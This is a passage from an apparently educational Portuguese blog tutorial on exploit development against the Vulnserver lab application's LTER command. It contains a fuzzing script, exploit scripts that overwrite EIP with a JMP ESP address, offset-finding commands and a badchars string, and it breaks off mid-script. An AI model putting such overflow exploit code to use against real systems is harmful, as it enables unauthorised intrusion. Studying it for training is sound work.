<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Windows Vulnserver Buffer Overflow - Parte 6 Badchars e Conclusão" /><meta name="author" content="Hastur" /><meta property="og:locale" content="en" /><meta name="description" content="COMANDO LTER" /><meta property="og:description" content="COMANDO LTER" /><link rel="canonical" href="https://h41stur.github.io/posts/std-winbof-6/" /><meta property="og:url" content="https://h41stur.github.io/posts/std-winbof-6/" /><meta property="og:site_name" content="H41stur" /><meta property="og:image" content="https://h41stur.github.io/img/std/winbof/winbof-logo-6.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-10-06T17:00:00-03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://h41stur.github.io/img/std/winbof/winbof-logo-6.png" /><meta property="twitter:title" content="Windows Vulnserver Buffer Overflow - Parte 6 Badchars e Conclusão" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@Hastur" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Hastur"},"dateModified":"2021-12-13T15:54:13-03:00","datePublished":"2021-10-06T17:00:00-03:00","description":"COMANDO LTER","headline":"Windows Vulnserver Buffer Overflow - Parte 6 Badchars e Conclusão","image":"https://h41stur.github.io/img/std/winbof/winbof-logo-6.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://h41stur.github.io/posts/std-winbof-6/"},"url":"https://h41stur.github.io/posts/std-winbof-6/"}</script><title>Windows Vulnserver Buffer Overflow - Parte 6 Badchars e Conclusão | H41stur</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="H41stur"><meta name="application-name" content="H41stur"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://h41stur.github.io/img/h41stur.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">H41stur</a></div><div class="site-subtitle font-italic">Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARQUIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>SOBRE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/h41stur" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['leonardor.toledo','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/leo-toledo/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Windows Vulnserver Buffer Overflow - Parte 6 Badchars e Conclusão</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Windows Vulnserver Buffer Overflow - Parte 6 Badchars e Conclusão</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Hastur </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Oct 6, 2021, 5:00 PM -0300" >Oct 6, 2021<i class="unloaded">2021-10-06T17:00:00-03:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Dec 13, 2021, 3:54 PM -0300" >Dec 13, 2021<i class="unloaded">2021-12-13T15:54:13-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2055 words">11 min read</span></div></div><div class="post-content"><h1 id="comando-lter">COMANDO LTER</h1><p>O comando LTER, assim como os demais, recebe um argumento e dá uma resposta. Neste comando, temos uma situação parecida com as anteriores, porém encontramos uma situação problema com badchars.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-77.png" alt="Enumaração do comando." /></p><h2 id="fuzzing">FUZZING</h2><p>Vamos reaproveitar nosso segundo script de fuzzing e adaptá-lo para o comando LTER.</p><p>fuzzing2.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="n">boofuzz</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="n">time</span>

<span class="k">def</span> <span class="nf">get_banner</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">my_logger</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
    <span class="n">banner_template</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">Welcome to Vulnerable Server! Enter HELP for help.</span><span class="sh">"</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">banner</span> <span class="o">=</span> <span class="n">target</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Nao foi possivel a conexao.</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">my_logger</span><span class="p">.</span><span class="nf">log_check</span><span class="p">(</span><span class="sh">"</span><span class="s">Recebendo banner...</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">banner_template</span> <span class="ow">in</span> <span class="n">banner</span><span class="p">:</span>
        <span class="n">my_logger</span><span class="p">.</span><span class="nf">log_pass</span><span class="p">(</span><span class="sh">"</span><span class="s">Banner recebido!</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">my_logger</span><span class="p">.</span><span class="nf">log_fail</span><span class="p">(</span><span class="sh">"</span><span class="s">Banner nao recebido</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Banner nao recebido, saindo...</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">session</span> <span class="o">=</span> <span class="nc">Session</span><span class="p">(</span>
            <span class="n">sleep_time</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
            <span class="n">target</span> <span class="o">=</span> <span class="nc">Target</span><span class="p">(</span>
                <span class="n">connection</span><span class="o">=</span><span class="nc">SocketConnection</span><span class="p">(</span><span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span><span class="p">,</span> <span class="mi">9999</span><span class="p">,</span> <span class="n">proto</span><span class="o">=</span><span class="sh">'</span><span class="s">tcp</span><span class="sh">'</span><span class="p">)</span>
                <span class="p">),</span>
            <span class="p">)</span>
    <span class="nf">s_initialize</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="sh">"</span><span class="s">Request</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">with</span> <span class="nf">s_block</span><span class="p">(</span><span class="sh">"</span><span class="s">Host-Line</span><span class="sh">"</span><span class="p">):</span>
        <span class="nf">s_static</span><span class="p">(</span><span class="sh">'</span><span class="s">LTER</span><span class="sh">'</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="sh">"</span><span class="s">command name</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">s_delim</span><span class="p">(</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">s_string</span><span class="p">(</span><span class="sh">"</span><span class="s">FUZZ</span><span class="sh">"</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="sh">"</span><span class="s">comando da variavel</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">s_delim</span><span class="p">(</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">session</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="nf">s_get</span><span class="p">(</span><span class="sh">"</span><span class="s">Request</span><span class="sh">"</span><span class="p">),</span> <span class="n">callback</span><span class="o">=</span><span class="n">get_banner</span><span class="p">)</span>
    <span class="n">session</span><span class="p">.</span><span class="nf">fuzz</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-78.png" alt="Enumaração do comando." /></p><p>Causamos um crash com o envio de 10.007 bytes constituidos de “/.”, como sabemos que esta quantia foi exagerada das ultimas vezes, vamos iniciar o esboço do exploit com um buffer de 3.000 bytes e monitorar.</p><p>xpllter.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="c1"># variaveis de conexao
</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="c1"># variaveis de payoad
</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">3000</span>

<span class="c1"># payload
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">LTER /.</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="n">offset</span>

<span class="c1"># criando conexao
</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Enviando payload...</span><span class="sh">"</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Payload enviado.</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><p>Após iniciar o vulnserver no Immunity, vamos monitorar seu comportamento.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-79.png" alt="Enumaração do comando." /></p><p>Causamos o crash e sobrescrevemos ESP e EIP, o próximo passo é descobrir o offset correto para atingirmos o EIP, vamos usar o <code class="language-plaintext highlighter-rouge">msf-patter_create</code>.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-80.png" alt="Enumaração do comando." /></p><p>Vamos monitorar o envio com o Immunity.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-81.png" alt="Enumaração do comando." /></p><p>Encontramos o offset 6f43386f, consultando no msf-patter_offset:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>msf-pattern_offset <span class="nt">-l</span> 3000 <span class="nt">-q</span> 6f43386f 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exact match at offset 2005
</pre></table></code></div></div><p>Para atingir o EIP, precisamos de 2005 bytes, vamos atualizar nosso script e monitorar o comportamento.</p><p>xpllter.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="c1"># variaveis de conexao
</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="c1"># variaveis de payoad
</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">3000</span>

<span class="c1"># payload
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">LTER /.</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">2005</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">4</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">C</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mi">2005</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span>

<span class="c1"># criando conexao
</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Enviando payload...</span><span class="sh">"</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Payload enviado.</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-82.png" alt="Enumaração do comando." /></p><p>Conseguimos sobrescrever o EIP com nossos “B”, vamos encontrar um JMP ESP com o Immunity para direcionarmos a execução para o nosso buffer.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-83.png" alt="Enumaração do comando." /></p><p>Encontramos nossos 9 endereços, no meu caso irei usar o 625011d3, lembrando que deve estar em little indian, ficando \xd3\x11\x50\x62.</p><p>Vamos atualizar o script e monitorar com o Immunity:</p><p>xpllter.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="c1"># variaveis de conexao
</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="c1"># variaveis de payoad
</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">3000</span>

<span class="c1"># payload
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">LTER /.</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">2005</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xd3\x11\x50\x62</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">C</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mi">2005</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span>

<span class="c1"># criando conexao
</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Enviando payload...</span><span class="sh">"</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Payload enviado.</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-84.png" alt="Enumaração do comando." /></p><p>Desta vez, algo deu errado.</p><p>Podemos observar duas coisas desta imagem:</p><ol><li>O ESP não foi sbrescrito;<li>O programa alterou nosso endereço de retorno de 625011d3 para 62501109.</ol><p>Isto pode nos indicar um problema de badchars.</p><h2 id="procurando-badchars">PROCURANDO BADCHARS</h2><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-85.png" alt="Enumaração do comando." /></p><p>Se observarmos esta imagem, podemos ver que o vulnerver trabalha com strings encodadas em ANSI. Estes caracteres tem o tamanho de 1 byte e vão de 0x00 a 0xff, ou seja, 256 possibilidades.</p><p>Precisamos encontrar quais destes são aceitos pelo vulnserver. Vamos criar uma string de badchars e enviar em nosso script.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>badchars 
<span class="se">\x</span>01<span class="se">\x</span>02<span class="se">\x</span>03<span class="se">\x</span>04<span class="se">\x</span>05<span class="se">\x</span>06<span class="se">\x</span>07<span class="se">\x</span>08<span class="se">\x</span>09<span class="se">\x</span>0a<span class="se">\x</span>0b<span class="se">\x</span>0c<span class="se">\x</span>0d<span class="se">\x</span>0e<span class="se">\x</span>0f<span class="se">\x</span>10<span class="se">\x</span>11<span class="se">\x</span>12<span class="se">\x</span>13<span class="se">\x</span>14<span class="se">\x</span>15<span class="se">\x</span>16<span class="se">\x</span>17<span class="se">\x</span>18<span class="se">\x</span>19<span class="se">\x</span>1a<span class="se">\x</span>1b<span class="se">\x</span>1c<span class="se">\x</span>1d<span class="se">\x</span>1e<span class="se">\x</span>1f<span class="se">\x</span>20<span class="se">\x</span>21<span class="se">\x</span>22<span class="se">\x</span>23<span class="se">\x</span>24<span class="se">\x</span>25<span class="se">\x</span>26<span class="se">\x</span>27<span class="se">\x</span>28<span class="se">\x</span>29<span class="se">\x</span>2a<span class="se">\x</span>2b<span class="se">\x</span>2c<span class="se">\x</span>2d<span class="se">\x</span>2e<span class="se">\x</span>2f<span class="se">\x</span>30<span class="se">\x</span>31<span class="se">\x</span>32<span class="se">\x</span>33<span class="se">\x</span>34<span class="se">\x</span>35<span class="se">\x</span>36<span class="se">\x</span>37<span class="se">\x</span>38<span class="se">\x</span>39<span class="se">\x</span>3a<span class="se">\x</span>3b<span class="se">\x</span>3c<span class="se">\x</span>3d<span class="se">\x</span>3e<span class="se">\x</span>3f<span class="se">\x</span>40<span class="se">\x</span>41<span class="se">\x</span>42<span class="se">\x</span>43<span class="se">\x</span>44<span class="se">\x</span>45<span class="se">\x</span>46<span class="se">\x</span>47<span class="se">\x</span>48<span class="se">\x</span>49<span class="se">\x</span>4a<span class="se">\x</span>4b<span class="se">\x</span>4c<span class="se">\x</span>4d<span class="se">\x</span>4e<span class="se">\x</span>4f<span class="se">\x</span>50<span class="se">\x</span>51<span class="se">\x</span>52<span class="se">\x</span>53<span class="se">\x</span>54<span class="se">\x</span>55<span class="se">\x</span>56<span class="se">\x</span>57<span class="se">\x</span>58<span class="se">\x</span>59<span class="se">\x</span>5a<span class="se">\x</span>5b<span class="se">\x</span>5c<span class="se">\x</span>5d<span class="se">\x</span>5e<span class="se">\x</span>5f<span class="se">\x</span>60<span class="se">\x</span>61<span class="se">\x</span>62<span class="se">\x</span>63<span class="se">\x</span>64<span class="se">\x</span>65<span class="se">\x</span>66<span class="se">\x</span>67<span class="se">\x</span>68<span class="se">\x</span>69<span class="se">\x</span>6a<span class="se">\x</span>6b<span class="se">\x</span>6c<span class="se">\x</span>6d<span class="se">\x</span>6e<span class="se">\x</span>6f<span class="se">\x</span>70<span class="se">\x</span>71<span class="se">\x</span>72<span class="se">\x</span>73<span class="se">\x</span>74<span class="se">\x</span>75<span class="se">\x</span>76<span class="se">\x</span>77<span class="se">\x</span>78<span class="se">\x</span>79<span class="se">\x</span>7a<span class="se">\x</span>7b<span class="se">\x</span>7c<span class="se">\x</span>7d<span class="se">\x</span>7e<span class="se">\x</span>7f<span class="se">\x</span>80<span class="se">\x</span>81<span class="se">\x</span>82<span class="se">\x</span>83<span class="se">\x</span>84<span class="se">\x</span>85<span class="se">\x</span>86<span class="se">\x</span>87<span class="se">\x</span>88<span class="se">\x</span>89<span class="se">\x</span>8a<span class="se">\x</span>8b<span class="se">\x</span>8c<span class="se">\x</span>8d<span class="se">\x</span>8e<span class="se">\x</span>8f<span class="se">\x</span>90<span class="se">\x</span>91<span class="se">\x</span>92<span class="se">\x</span>93<span class="se">\x</span>94<span class="se">\x</span>95<span class="se">\x</span>96<span class="se">\x</span>97<span class="se">\x</span>98<span class="se">\x</span>99<span class="se">\x</span>9a<span class="se">\x</span>9b<span class="se">\x</span>9c<span class="se">\x</span>9d<span class="se">\x</span>9e<span class="se">\x</span>9f<span class="se">\x</span>a0<span class="se">\x</span>a1<span class="se">\x</span>a2<span class="se">\x</span>a3<span class="se">\x</span>a4<span class="se">\x</span>a5<span class="se">\x</span>a6<span class="se">\x</span>a7<span class="se">\x</span>a8<span class="se">\x</span>a9<span class="se">\x</span>aa<span class="se">\x</span>ab<span class="se">\x</span>ac<span class="se">\x</span>ad<span class="se">\x</span>ae<span class="se">\x</span>af<span class="se">\x</span>b0<span class="se">\x</span>b1<span class="se">\x</span>b2<span class="se">\x</span>b3<span class="se">\x</span>b4<span class="se">\x</span>b5<span class="se">\x</span>b6<span class="se">\x</span>b7<span class="se">\x</span>b8<span class="se">\x</span>b9<span class="se">\x</span>ba<span class="se">\x</span>bb<span class="se">\x</span>bc<span class="se">\x</span>bd<span class="se">\x</span>be<span class="se">\x</span>bf<span class="se">\x</span>c0<span class="se">\x</span>c1<span class="se">\x</span>c2<span class="se">\x</span>c3<span class="se">\x</span>c4<span class="se">\x</span>c5<span class="se">\x</span>c6<span class="se">\x</span>c7<span class="se">\x</span>c8<span class="se">\x</span>c9<span class="se">\x</span>ca<span class="se">\x</span>cb<span class="se">\x</span>cc<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>ce<span class="se">\x</span>cf<span class="se">\x</span>d0<span class="se">\x</span>d1<span class="se">\x</span>d2<span class="se">\x</span>d3<span class="se">\x</span>d4<span class="se">\x</span>d5<span class="se">\x</span>d6<span class="se">\x</span>d7<span class="se">\x</span>d8<span class="se">\x</span>d9<span class="se">\x</span>da<span class="se">\x</span>db<span class="se">\x</span>dc<span class="se">\x</span><span class="nb">dd</span><span class="se">\x</span>de<span class="se">\x</span><span class="nb">df</span><span class="se">\x</span>e0<span class="se">\x</span>e1<span class="se">\x</span>e2<span class="se">\x</span>e3<span class="se">\x</span>e4<span class="se">\x</span>e5<span class="se">\x</span>e6<span class="se">\x</span>e7<span class="se">\x</span>e8<span class="se">\x</span>e9<span class="se">\x</span>ea<span class="se">\x</span>eb<span class="se">\x</span>ec<span class="se">\x</span>ed<span class="se">\x</span>ee<span class="se">\x</span>ef<span class="se">\x</span>f0<span class="se">\x</span>f1<span class="se">\x</span>f2<span class="se">\x</span>f3<span class="se">\x</span>f4<span class="se">\x</span>f5<span class="se">\x</span>f6<span class="se">\x</span>f7<span class="se">\x</span>f8<span class="se">\x</span>f9<span class="se">\x</span>fa<span class="se">\x</span>fb<span class="se">\x</span><span class="nb">fc</span><span class="se">\x</span>fd<span class="se">\x</span>fe<span class="se">\x</span>ff
</pre></table></code></div></div><p>xpllter.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="c1"># variaveis de conexao
</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>

